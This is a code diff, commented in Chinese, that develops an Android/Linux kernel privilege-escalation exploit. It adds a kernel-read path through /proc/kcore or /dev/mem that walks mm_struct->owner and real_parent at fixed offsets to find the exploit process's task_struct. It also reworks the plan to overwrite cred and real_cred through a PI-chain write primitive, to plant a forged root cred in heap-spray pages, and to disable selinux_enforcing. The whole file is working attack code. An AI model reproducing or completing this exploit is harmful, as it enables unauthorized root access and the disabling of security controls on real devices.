@@ -221,28 +221,50 @@ static void trace(const char *msg) {
 }
 
 /*
- * 可插拔内核读接口: 从 mm_struct 地址推导 task_struct.
- * kernelsnitch leak 的是 clone_leak_child 的 mm_struct, 通过 mm->owner
- * (MM_OWNER_OFF=0x408) 可拿到对应 task_struct 指针.
+ * 内核读接口: 从 mm_struct 地址推导 task_struct.
  *
- * 当前为占位实现 (返回 0). 实现方式待定:
- *   - configfs_read_once 有 bug (needs_read_fill=0 + buffer_size=0 → 返回0)
- *   - 需修复 configfs 或找 XRing O1 替代内核读路径
- *   - 若 leak 的是 child mm, 还需读 task->real_parent (TASK_REAL_PARENT_OFF=0x628)
- *     拿到 parent (exploit 进程) 的 task_struct
+ * kernelsnitch 在 clone_leak_child 内运行, leak 的是 CHILD 的 mm_struct.
+ * 推导链 (两次内核读):
+ *   child mm_struct --mm->owner@+0x408--> child task_struct
+ *                 --task->real_parent@+0x628--> parent task_struct (exploit 进程)
+ * 我们要 root 的是 exploit 进程 (parent), 所以返回 parent task_struct.
+ *
+ * 内核读通过独立的 kread 后端 (/proc/kcore 或 /dev/mem), 不依赖已失效的
+ * ashmem/configfs. 读到的指针用 is_kernel_ptr 做基本 sanity check.
+ *
+ * 注: 若将来让 kernelsnitch 在 parent 线程内运行 (直接 leak parent mm),
+ * 则只需读一次 mm->owner, 不需要 follow real_parent. 当前默认 follow.
  */
+static int g_leak_follow_real_parent = 1;  /* child mm: 需 follow 到 parent */
+
 static uintptr_t leak_task_struct(uintptr_t mm_struct_addr) {
   if (!mm_struct_addr || mm_struct_addr == (uintptr_t)-1) {
     return 0;
   }
-  /* TODO: 实现内核读
-   * uintptr_t task = kernel_read64(some_fd, mm_struct_addr + MM_OWNER_OFF);
-   * 若是 child mm, 再读 parent:
-   *   task = kernel_read64(some_fd, task + TASK_REAL_PARENT_OFF);
-   */
-  pr_info("leak_task_struct: TODO mm=%016zx (need kernel read of mm->owner@+0x408)\n",
-          mm_struct_addr);
-  return 0;
+  if (kread_open() != 0) {
+    pr_error("leak_task_struct: no kernel read backend "
+             "(need /proc/kcore or /dev/mem openable in this domain)\n");
+    return 0;
+  }
+
+  uintptr_t child_task = kread64(mm_struct_addr + MM_OWNER_OFF);
+  pr_info("leak mm->owner=%016zx\n", child_task);
+  if (!is_kernel_ptr(child_task)) {
+    pr_error("leak_task_struct: bad mm->owner (kernel read returned junk)\n");
+    return 0;
+  }
+
+  if (!g_leak_follow_real_parent) {
+    return child_task;
+  }
+
+  uintptr_t parent_task = kread64(child_task + TASK_REAL_PARENT_OFF);
+  pr_info("leak child->real_parent=%016zx\n", parent_task);
+  if (!is_kernel_ptr(parent_task)) {
+    pr_error("leak_task_struct: bad real_parent (kernel read returned junk)\n");
+    return 0;
+  }
+  return parent_task;
 }
 
 static int check_uid_zero(void) {
@@ -275,13 +297,24 @@ int run_exploit(int argc, char **argv) {
 
   /*
    * Cred 直写路线 (参考 dijun 成功案例):
-   *   mm leaked → walk#1 写 real_cred=init_cred
-   *            → walk#2 写 cred=init_cred
-   *            → walk#3 写 selinux_enforcing=0
+   *   mm leaked → walk#1 写 real_cred = <spray node addr>
+   *            → walk#2 写 cred     = <spray node addr>
+   *            → walk#3 写 selinux_enforcing = 0
    *
-   * 写入机制 (util.c:480-482, 544-546):
-   *   *(write_left + 0x08) = write_pc
-   *   set_pselect_write(target-8, value, 0) → *(target) = value
+   * 写入机制 (chain_disasm.txt 反汇编确认):
+   *   PI 链 rb_insert 写的是 **节点地址** (spray 对象 &node.pi_tree_entry),
+   *   不是 write_pc / INIT_CRED!  (rt_mutex_adjust_prio_chain:
+   *   line 193 str x25,[x11,x13] 与 line 407-409 str x0,[x11,x13],
+   *   x0 = node.pi_tree_entry, x11 = 被控 parent, x13 = rb_child 偏移)
+   *   写入目标 = 任意地址, 由 fake_w0.pi_tree_entry.rb_left/rb_right
+   *   指向 (target-8 / target-0x10) 决定.  即: *(target) = node_addr.
+   *
+   * 推论 (关键, 待设备验证): 既然写的是节点地址, 要让 task->cred/real_cred
+   *   指向有效 cred, spray 页面必须在该节点偏移处放一份 **伪造 cred**
+   *   (uid=0, gid=0, cap=全开, securebits=0, ...). 目前 prepare_skb_payload
+   *   把 fake_w0.pi_tree_entry 填成 {write_pc, write_right, write_left},
+   *   不含 cred —— 这是下一步必须补齐的部分 (在 spray 页面安排伪造 cred
+   *   并让插入节点落在它上面).  walks[].value 此处仅作文档用途.
    *
    * backup_v1 已有基础: kernelsnitch 接口, set_pselect_write 参数化,
    *   prepare_skb_payload 自定义模式 (pselect_write_target!=0),
@@ -289,7 +322,7 @@ int run_exploit(int argc, char **argv) {
    */
   struct {
     uintptr_t target;  /* 写入目标地址 (real_cred / cred / selinux) */
-    uintptr_t value;   /* 写入值 (init_cred / 0) */
+    uintptr_t value;   /* 文档用途: 期望写 init_cred / 0 (实际写的是节点地址) */
     const char *name;
   } walks[3];
   walks[0].target = 0;               walks[0].value = INIT_CRED; walks[0].name = "real_cred";
